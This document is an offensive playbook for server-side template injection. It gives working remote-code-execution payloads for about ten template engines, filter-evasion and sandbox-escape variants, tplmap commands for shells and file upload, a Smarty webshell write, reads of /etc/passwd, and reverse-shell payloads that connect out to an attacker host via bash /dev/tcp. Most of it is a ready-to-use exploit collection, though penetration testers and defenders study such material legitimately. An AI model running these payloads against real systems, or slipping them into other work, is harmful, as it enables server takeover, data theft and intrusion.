# SSTI (Server-Side Template Injection) Playbook

## Indicators

Signs this vulnerability may be present:
- User input reflected in dynamically generated pages
- Email templates with customizable fields
- PDF/document generation from user input
- Error messages showing template syntax or engine names
- URL parameters like `template=`, `theme=`, `layout=`, `view=`
- CMS or blog platforms with custom theming
- Marketing/newsletter systems with personalization
- Invoice or report generation features
- Greeting cards or certificate generators

## Detection Polyglots

Test payloads that work across multiple template engines:

```
${{<%[%'"}}%\.
{{7*7}}[[5*5]]
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
@(7*7)
{{constructor.constructor('return this')()}}
```

## Template Engine Identification

| Input | Output | Template Engine |
|-------|--------|-----------------|
| `{{7*7}}` | 49 | Jinja2, Twig, Nunjucks |
| `{{7*'7'}}` | 7777777 | Jinja2 |
| `{{7*'7'}}` | 49 | Twig |
| `${7*7}` | 49 | Freemarker, Velocity, Thymeleaf |
| `<%= 7*7 %>` | 49 | ERB (Ruby) |
| `#{7*7}` | 49 | Slim, Pebble |
| `*{7*7}` | 49 | Thymeleaf |
| `@(7*7)` | 49 | Razor (.NET) |
| `#set($x=7*7)$x` | 49 | Velocity |
| `[%7*7%]` | 49 | Smarty |
| `{{=7*7}}` | 49 | doT.js |

## Tools

### tplmap

```bash
# Basic SSTI detection
tplmap -u "http://target.com/page?name=test"

# POST request
tplmap -u "http://target.com/page" -d "name=test"

# With cookies
tplmap -u "http://target.com/page?name=test" --cookie "session=abc123"

# Specify injection point
tplmap -u "http://target.com/page?name=test*"

# Force specific engine
tplmap -u "http://target.com/page?name=test" -e jinja2

# Execute command
tplmap -u "http://target.com/page?name=test" --os-cmd "id"

# Interactive shell
tplmap -u "http://target.com/page?name=test" --os-shell

# Read file
tplmap -u "http://target.com/page?name=test" --download "/etc/passwd" "./passwd"

# Upload file
tplmap -u "http://target.com/page?name=test" --upload "./shell.php" "/var/www/html/shell.php"

# Bind shell
tplmap -u "http://target.com/page?name=test" --bind-shell 4444

# Reverse shell
tplmap -u "http://target.com/page?name=test" --reverse-shell attacker.com 4444
```

### Manual Testing with curl

```bash
# Test basic math operations
curl "http://target.com/page?name={{7*7}}"
curl "http://target.com/page?name=\${7*7}"
curl "http://target.com/page?name=<%=7*7%>"
curl "http://target.com/page?name=#{7*7}"

# POST request testing
curl -X POST "http://target.com/page" -d "name={{7*7}}"

# URL encoded payloads
curl "http://target.com/page?name=%7B%7B7*7%7D%7D"

# Test string operations (Jinja2)
curl "http://target.com/page?name={{7*'7'}}"
```

### Python SSTI Testing

```python
#!/usr/bin/env python3
import requests
from urllib.parse import quote

target = "http://target.com/page"
param = "name"

# Detection payloads for various engines
payloads = {
    "Jinja2/Twig": "{{7*7}}",
    "Jinja2 (string)": "{{7*'7'}}",
    "Freemarker": "${7*7}",
    "Velocity": "#set($x=7*7)$x",
    "ERB": "<%= 7*7 %>",
    "Pebble": "#{7*7}",
    "Smarty": "{7*7}",
    "Mako": "${7*7}",
    "Thymeleaf": "*{7*7}",
    "Razor": "@(7*7)",
}

def detect_engine():
    for engine, payload in payloads.items():
        url = f"{target}?{param}={quote(payload)}"
        try:
            response = requests.get(url, timeout=10)
            if "49" in response.text:
                print(f"[+] Possible {engine}: {payload}")
                if engine == "Jinja2 (string)" and "7777777" in response.text:
                    print(f"    -> Confirmed Jinja2 (string multiplication)")
            elif "7777777" in response.text:
                print(f"[+] Jinja2 detected (string multiplication): {payload}")
        except Exception as e:
            print(f"[-] Error with {engine}: {e}")

def test_rce_jinja2():
    """Test RCE payloads for Jinja2"""
    payloads = [
        "{{config}}",
        "{{self.__init__.__globals__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
    ]
    for payload in payloads:
        url = f"{target}?{param}={quote(payload)}"
        response = requests.get(url)
        if len(response.text) > 100:
            print(f"[+] Jinja2 payload works: {payload[:50]}...")

if __name__ == "__main__":
    print("[*] Detecting template engine...")
    detect_engine()
```

## Techniques

### 1. Jinja2 (Python - Flask, Django)

Detection:
```
{{7*7}}      -> 49
{{7*'7'}}    -> 7777777
{{config}}   -> Shows Flask config
```

Information disclosure:
```python
# Flask config
{{config}}
{{config.items()}}

# Self object
{{self}}
{{self.__dict__}}

# Global variables
{{g}}
{{request}}
{{request.environ}}
{{request.args}}
```

RCE - Method Chaining:
```python
# Basic class enumeration
{{''.__class__.__mro__[1].__subclasses__()}}

# Find subprocess.Popen index
{{''.__class__.__mro__[1].__subclasses__()[INDEX]}}

# Execute command (find correct index for Popen)
{{''.__class__.__mro__[2].__subclasses__()[40]('id',shell=True,stdout=-1).communicate()}}

# Using config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Alternative method
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Lipsum trick
{{lipsum.__globals__['os'].popen('id').read()}}

# Cycler trick
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Joiner trick
{{joiner.__init__.__globals__.os.popen('id').read()}}
```

Full RCE payload (find Popen class):
```python
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {% for b in c.__init__.__globals__.values() %}
      {% if b.__class__ == {}.__class__ %}
        {% if 'eval' in b.keys() %}
          {{ b['eval']('__import__("os").popen("id").read()') }}
        {% endif %}
      {% endif %}
    {% endfor %}
  {% endif %}
{% endfor %}
```

### 2. Twig (PHP - Symfony)

Detection:
```
{{7*7}}      -> 49
{{7*'7'}}    -> 49 (unlike Jinja2)
{{_self}}    -> Shows template object
```

Information disclosure:
```twig
{{_self}}
{{_self.env}}
{{_self.getTemplateName()}}
{{app.request.server.all|join(',')}}
```

RCE:
```twig
# Using filter
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Older Twig versions
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Twig 1.x
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}

# Read file
{{"/etc/passwd"|file_excerpt(1,30)}}

# PHP code execution
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('exec')}}
{{['id',0]|sort('system')}}

# Include template from string
{{include(template_from_string("<?php system('id'); ?>"))}}
```

### 3. Freemarker (Java)

Detection:
```
${7*7}       -> 49
<#assign x=7*7>${x}  -> 49
${.version}  -> Shows version
```

Information disclosure:
```freemarker
${.data_model}
${.vars}
${.globals}
${.version}
```

RCE:
```freemarker
# Execute command
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Alternative
${"freemarker.template.utility.Execute"?new()("id")}

# ObjectConstructor
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign rt=oc("java.lang.Runtime")>
${rt.getRuntime().exec("id")}

# Read file
${object.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(",")}
```

### 4. Velocity (Java)

Detection:
```
#set($x=7*7)$x     -> 49
${7*7}             -> 49
$class.inspect("java.lang.Runtime")  -> Class info
```

RCE:
```velocity
# Using ClassTool
#set($s="")
#set($rt=$s.class.forName("java.lang.Runtime"))
#set($obj=$rt.getRuntime())
#set($exec=$rt.getMethod("exec", "".class))
#set($proc=$exec.invoke($obj, "id"))
$proc

# Alternative
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### 5. Pebble (Java)

Detection:
```
#{7*7}       -> 49
{{ 7*7 }}    -> 49
```

RCE:
```pebble
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
```

### 6. Mako (Python)

Detection:
```
${7*7}       -> 49
<%  %>       -> Template tags
```

RCE:
```mako
<%
import os
x = os.popen('id').read()
%>
${x}

# One-liner
${__import__('os').popen('id').read()}

# Alternative
<% import subprocess %>${subprocess.check_output('id', shell=True)}
```

### 7. Smarty (PHP)

Detection:
```
{7*7}        -> 49
{$smarty.version}  -> Version info
```

RCE:
```smarty
# PHP tags (if enabled)
{php}echo system('id');{/php}

# Deprecated in newer versions, use:
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}

# If security disabled
{$smarty.template_object->smarty->fetch('string:{system("id")}')}
```

### 8. ERB (Ruby)

Detection:
```
<%= 7*7 %>   -> 49
<%= self %>  -> Shows object
```

RCE:
```erb
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id') %>
<%= exec('id') %>

# File read
<%= File.open('/etc/passwd').read %>
```

### 9. Razor (.NET)

Detection:
```
@(7*7)       -> 49
@DateTime.Now  -> Current time
```

RCE:
```razor
@{
    var process = new System.Diagnostics.Process();
    process.StartInfo.FileName = "cmd.exe";
    process.StartInfo.Arguments = "/c id";
    process.StartInfo.RedirectStandardOutput = true;
    process.Start();
    @process.StandardOutput.ReadToEnd()
}

# Simpler
@System.Diagnostics.Process.Start("cmd","/c id").StandardOutput.ReadToEnd()
```

### 10. Handlebars (JavaScript/Node.js)

Detection:
```
{{7*7}}      -> 49 (or 7*7 literal)
{{this}}     -> Shows context
```

RCE (requires helper registration or prototype pollution):
```handlebars
# If constructor is accessible
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Bypass Techniques

### Filter Evasion - Jinja2

```python
# Blocked: . (dot)
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}

# Blocked: _ (underscore)
{{request|attr('\x5f\x5fclass\x5f\x5f')}}
{{request|attr(['\x5f\x5fclass','\x5f\x5f']|join)}}

# Blocked: single/double quotes
{{request|attr(request.args.class)}}&class=__class__
{{lipsum|attr(request.args.a)|attr(request.args.b)(request.args.c)|attr(request.args.d)(request.args.e)|attr(request.args.f)()}}&a=__globals__&b=__getitem__&c=os&d=popen&e=id&f=read

# Blocked: [ ] brackets
{{request|attr('__class__')}}

# Blocked: {{}}
{% print 7*7 %}
{%print config%}

# Using filters
{{()|attr('__class__')|attr('__bases__')|attr('__getitem__')(0)}}

# Hex encoding
{{request|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')}}

# Unicode encoding
{{request|attr('\u005f\u005fclass\u005f\u005f')}}

# Format strings
{{"%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)}}  # __class__
```

### Filter Evasion - Twig

```twig
# Blocked: common functions
{{'id'|filter('system')}}
{{'id'|filter('passthru')}}
{{'id'|filter('shell_exec')}}

# Alternative execution
{{['id']|map('system')|join}}
{{['id',0]|sort('system')}}
{{['id']|filter('exec')}}

# Blocked: quotes
{{_self.env.registerUndefinedFilterCallback(chr(115)~chr(121)~chr(115)~chr(116)~chr(101)~chr(109))}}
```

### Filter Evasion - General

```python
# String concatenation (Jinja2)
{{'i'+'d'}}
{{['i','d']|join}}
{%set a='i'%}{%set b='d'%}{{a~b}}

# Reversing strings
{{'di'|reverse}}

# Base64 encoding payloads and decoding in template
{{''.__class__.__mro__[1].__subclasses__()}}
```

### Sandbox Escape - Jinja2

```python
# Access builtins via string methods
{{().__class__.__bases__[0].__subclasses__()}}

# Find catch_warnings class
{% for c in ().__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
{{ c.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()') }}
{% endif %}
{% endfor %}

# Access os module via various paths
{{lipsum.__globals__['os']}}
{{cycler.__init__.__globals__['os']}}
{{namespace.__init__.__globals__['os']}}
{{url_for.__globals__['os']}}
{{get_flashed_messages.__globals__['os']}}
```

## Payload Collection

### Quick RCE Payloads

```
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig
{{['id']|filter('system')}}

# Freemarker
${"freemarker.template.utility.Execute"?new()("id")}

# Velocity
#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end

# Mako
${__import__('os').popen('id').read()}

# Smarty
{system('id')}

# ERB
<%= `id` %>
```

### Reverse Shell Payloads

```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"').read()}}

# Mako
${__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"').read()}

# ERB
<%= `bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'` %>
```

## Success Indicators

- Mathematical expressions evaluated correctly (e.g., `{{7*7}}` returns `49`)
- Template engine information or version disclosed
- Configuration objects or environment variables exposed
- File contents read successfully
- Command output returned in response
- Reverse shell connection established
- Template syntax errors revealing engine type
- Different behavior between string and integer multiplication
- Time-based detection (sleep command causes delay)
- Out-of-band callbacks received (DNS/HTTP)
